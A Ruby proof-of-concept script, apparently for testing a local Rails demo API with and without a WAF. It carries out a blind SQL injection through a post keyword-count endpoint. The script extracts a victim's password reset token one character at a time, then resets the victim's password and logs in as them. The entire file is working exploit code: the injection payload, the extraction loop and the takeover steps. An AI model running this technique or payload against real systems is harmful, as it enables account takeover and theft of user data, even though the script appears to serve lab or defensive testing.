#! /usr/local/bin/ruby

require "uri"
require "net/http"
require "securerandom"
require "json"
require "active_support"
require "active_support/core_ext"

# WAFを通さない
RAILS_ROOT_URL = "http://localhost:3000"

# WAF(nginx)を通す
# RAILS_ROOT_URL = "http://localhost:80"

SIGN_UP_PATH = "/api/v1/users/sign_up"
ACTIVATE_PATH = "/api/v1/users/activate"
SIGN_IN_PATH = "/api/v1/users/sign_in"
REQUEST_PASSWORD_RESET_PATH = "/api/v1/users/request_password_reset"
RESET_PASSWORD_PATH = "/api/v1/users/password_reset"
ME_PATH = "/api/v1/users/me"

POST_CREATE_PATH = "/api/v1/posts"
COUNT_KEYWORD_PATH = "/api/v1/posts/count_keyword"
CHARACTORS = [*('A'..'Z'), *('a'..'z'), *('0'..'9'), '_', '-']

def create_user
  user = generate_user
  token, _ = sign_up(user)

  activate(token)
  user
end

# Around API
def sign_up(user)
  response = post(SIGN_UP_PATH, user.slice(:email, :password))

  [JSON.parse(response.read_body)["token"], user]
end

def activate(token)
  response = post(ACTIVATE_PATH, { token: token })
end

def sign_in(user)
  response = post(SIGN_IN_PATH, user.slice(:email, :password))

  [JSON.parse(response.read_body), response.header["Set-Cookie"]]
end

def me(session_cookie)
  response = get(ME_PATH, {}, [["Cookie", session_cookie]])

  JSON.parse(response.read_body)
end

def create_post(session_cookie, params)
  response = post(POST_CREATE_PATH, params.slice(:title, :content, :tags), [["Cookie", session_cookie]])
  JSON.parse(response.read_body)
end

def request_password_reset(email)
  response = post(REQUEST_PASSWORD_RESET_PATH, { email: email })
  JSON.parse(response.read_body)
end

def password_reset(token, password)
  response = post(RESET_PASSWORD_PATH, { token: token, password: password })
  JSON.parse(response.read_body)
end

def count_keyword(session_cookie, keyword)
  response = get(COUNT_KEYWORD_PATH, { keyword: keyword }, [["Cookie", session_cookie]])
  JSON.parse(response.read_body)
end

def post(path, params = {}, headers = [])
  url = URI("#{RAILS_ROOT_URL}#{path}")
  http = Net::HTTP.new(url.host, url.port);
  request = Net::HTTP::Post.new(url)
  request.body = params.to_json
  request["Content-Type"] = "application/json"
  headers.each { |header| request[header[0]] = header[1] }
  response = http.request(request)

  response
end

def get(path, params = {}, headers = [])
  url = URI("#{RAILS_ROOT_URL}#{path}?#{params.to_query}")
  http = Net::HTTP.new(url.host, url.port);
  request = Net::HTTP::Get.new(url)
  headers.each { |header| request[header[0]] = header[1] }
  response = http.request(request)

  response
end

# User
def random_email; "#{SecureRandom.hex(10)}@example.com"; end
def random_password; "#{SecureRandom.hex(10)}"; end
def generate_user; { email: random_email, password: random_password }; end


def main
  # 下準備 被害に遭うユーザーを作成する
  victim = create_user
  _, victim_cookie = sign_in(victim)
  puts "==== target ===="
  puts me(victim_cookie)
  puts "================"

  # 実際に攻撃を行うシナリオ
  # まずは攻撃者がアカウントを作成してログイン
  attacker = create_user
  _, session_cookie = sign_in(attacker)

  # countの結果を利用するので、攻撃者が投稿を作成する
  create_post(session_cookie, { title: "title", content: "content", tags: "tag1, piyo, tag2" })

  # 攻撃者が攻撃対象のパスワードリセット要求を送る
  request_password_reset(victim[:email])

  # 実際の攻撃
  token = ''
  token_updated = true
  while token_updated
    token_updated = false
    CHARACTORS.each do |alphabet|
      # SQL
      # SELECT
      # COUNT(*)
      # FROM
      #   `posts`
      # WHERE
      #   `posts`.`user_id` = 122
      #   AND (tags like 'ここに文字列が入る')
      injection_query = "piyo%' and 1 in (select 1 from users where reset_password_token like '#{token}#{alphabet}%' and email = '#{victim[:email]}') and 'hoge' like '"
      res = count_keyword(session_cookie, injection_query)
      if res['count'] > 0
        token += alphabet
        token_updated = true
        print("\rtoken searching... #{token}")
        break
      end
    end
  end

  puts "\nGOT: #{token}"

  # 最後にパスワードを変更して、攻撃者がログインできることを確認する
  password_reset(token, "new_password")
  _, got_session = sign_in({ email: victim[:email], password: "new_password" })
  puts "==== target ===="
  puts "password changed!"
  puts me(got_session)
  puts "================"
end

puts main
